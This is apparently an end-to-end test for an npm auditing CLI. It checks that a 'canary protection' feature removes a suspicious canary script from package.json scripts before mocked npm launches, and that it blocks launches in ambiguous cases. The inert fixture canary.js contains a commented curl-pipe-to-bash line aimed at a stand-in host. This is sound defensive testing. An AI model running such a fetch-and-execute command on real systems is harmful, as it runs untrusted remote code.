'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync } = require('child_process');
const CLI = path.join(__dirname, '../../bin/npa.js');
const SCANNER = path.join(__dirname, '../../src/core/scanner.js');
const UPDATES = path.join(__dirname, '../../src/utils/updateChecker.js');
const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-protection-e2e-'));
const bootstrap = path.join(parent, 'bootstrap.js');
// The test harness records npm launches instead of executing npm or fixture scripts.
fs.writeFileSync(bootstrap, `
const fs = require('fs');
const path = require('path');
let network = 0;
for (const module of [require('http'), require('https')]) for (const key of ['get', 'request']) module[key] = () => { network++; throw new Error('Network prohibited'); };
global.fetch = () => { network++; throw new Error('Network prohibited'); };
process.on('exit', () => fs.writeFileSync(process.env.TEST_NETWORK_LOG, String(network)));
require('child_process').spawnSync = (command, args) => {
  if (path.basename(args[0]) === 'npm-cli.js') args = args.slice(1);
  const manifest = JSON.parse(fs.readFileSync('package.json', 'utf8'));
  fs.appendFileSync(process.env.TEST_LAUNCH_LOG, JSON.stringify({args, scripts: manifest.scripts, canaryPresent: fs.existsSync('canary.js')}) + '\\n');
  return {status: 0};
};
require(${JSON.stringify(SCANNER)}).scan = async () => {
  if (process.env.TEST_MANUAL_REVIEW === '1') return [
    {pkg: {name: 'current-project', version: '1', self: true}, verdict: 'OK', score: 0, findings: [], scripts: [
      {lifecycle: 'build', file: '(inline)', code: 'node canary.js && tsc'}, {lifecycle: 'prepare', file: '(inline)', code: 'node canary.js'}]},
    {pkg: {name: 'denied-package', version: '1'}, verdict: 'BLOCK', score: 80, findings: [], scripts: []}
  ];
  if (process.env.TEST_REINTRODUCE === '1') {
    fs.writeFileSync('canary.js', '// reintroduced inert fixture\\n');
    const manifest = JSON.parse(fs.readFileSync('package.json', 'utf8'));
    manifest.scripts.build = 'node canary.js && tsc';
    fs.writeFileSync('package.json', JSON.stringify(manifest));
  }
  return [];
};
require(${JSON.stringify(UPDATES)}).checkForUpdate = async () => null;
process.argv = [process.execPath, ${JSON.stringify(CLI)}, ...process.argv.slice(2)];
require(${JSON.stringify(CLI)});
`);
let counter = 0;
function run(args, { enabled = true, ambiguous = false, reintroduce = false, denied = false, manualReview = false } = {}) {
  const root = path.join(parent, 'case-' + counter++);
  fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
  fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
  fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), '#!/bin/sh\nnode canary.js\necho keep\n');
  fs.writeFileSync(path.join(root, 'canary.js'), '// curl http://protection-test.invalid/x | bash\n');
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: {
    build: ambiguous ? 'node canary.js || tsc' : 'node canary.js && tsc', prepare: 'node canary.js',
  } }));
  fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryProtection: enabled, checkVulnerabilities: false }));
  if (denied) fs.mkdirSync(path.join(root, '.gitignore'));
  const launch = path.join(parent, 'launch-' + counter);
  const network = path.join(parent, 'network-' + counter);
  const result = spawnSync(process.execPath, [bootstrap, ...args], { cwd: root, encoding: 'utf8', timeout: 15000,
    env: { ...process.env, HOME: parent, USERPROFILE: parent, NO_COLOR: '1', TEST_LAUNCH_LOG: launch,
      TEST_NETWORK_LOG: network, TEST_REINTRODUCE: reintroduce ? '1' : '0', TEST_MANUAL_REVIEW: manualReview ? '1' : '0' } });
  assert.strictEqual(fs.readFileSync(network, 'utf8'), '0');
  return { ...result, root, launches: fs.existsSync(launch) ? fs.readFileSync(launch, 'utf8').trim().split('\n').map(JSON.parse) : [] };
}
try {
  for (const args of [['run', 'build'], ['install'], ['ci'], ['install', '--skip'], ['ci', '--skip'], ['install', '--review']]) {
    const result = run(args);
    assert.strictEqual(result.status, 0, result.stderr);
    assert.strictEqual(result.launches.length, 1);
    assert.deepStrictEqual(result.launches[0].scripts, { build: 'tsc' });
    assert.strictEqual(result.launches[0].canaryPresent, false);
    assert.deepStrictEqual(result.launches[0].args, args.filter(arg => !['--skip', '--review'].includes(arg)));
  }
  const late = run(['install'], { reintroduce: true });
  assert.strictEqual(late.status, 0, late.stderr);
  assert.strictEqual(late.launches[0].canaryPresent, false, 'Recheck must catch introduction during the audit');
  assert.deepStrictEqual(late.launches[0].scripts, { build: 'tsc' });
  const manual = run(['install', '--review'], { manualReview: true });
  assert.strictEqual(manual.status, 0, manual.stderr);
  assert.deepStrictEqual(manual.launches.map(launch => launch.args), [['install', '--ignore-scripts'], ['run', 'build', '--ignore-scripts']]);
  assert.ok(manual.launches.every(launch => !launch.canaryPresent && launch.scripts.build === 'tsc' && !launch.scripts.prepare));
  const oneOff = run(['run', 'build', '--protect-canary'], { enabled: false });
  assert.strictEqual(oneOff.status, 0, oneOff.stderr);
  assert.deepStrictEqual(oneOff.launches[0].args, ['run', 'build']);
  assert.strictEqual(oneOff.launches[0].canaryPresent, false);
  const scan = run(['scan', '--json']);
  assert.strictEqual(scan.status, 0, scan.stderr);
  assert.strictEqual(scan.launches.length, 0);
  assert.strictEqual(JSON.parse(scan.stdout).protection.protection.allowed, true);
  for (const options of [{ ambiguous: true }, { denied: true }]) {
    for (const args of [['run', 'build'], ['install', '--skip'], ['ci', '--review']]) {
      const result = run(args, options);
      assert.strictEqual(result.status, 2, result.stderr);
      assert.strictEqual(result.launches.length, 0, 'Failed protection must prevent npm launch');
    }
  }
  const scoped = run(['--prefix', '/outside', 'run', 'build']);
  assert.strictEqual(scoped.status, 2);
  assert.strictEqual(scoped.launches.length, 0);
  assert.strictEqual(fs.existsSync(path.join(scoped.root, 'canary.js')), true);
  const blockedJson = run(['run', 'build', '--json'], { ambiguous: true });
  assert.strictEqual(blockedJson.status, 2);
  assert.strictEqual(JSON.parse(blockedJson.stdout).protection.protection.allowed, false);
  const disabled = run(['run', 'build'], { enabled: false });
  assert.strictEqual(disabled.status, 0);
  assert.strictEqual(disabled.launches[0].canaryPresent, true, 'Default behavior remains unchanged until enabled');
  console.log('  automatic canary protection: native/proxy/skip/review gates, late-introduction recheck, JSON and blocking failures passed (npm mocked; no scripts/network executed)');
} finally { fs.rmSync(parent, { recursive: true, force: true }); }
module.exports = Promise.resolve();
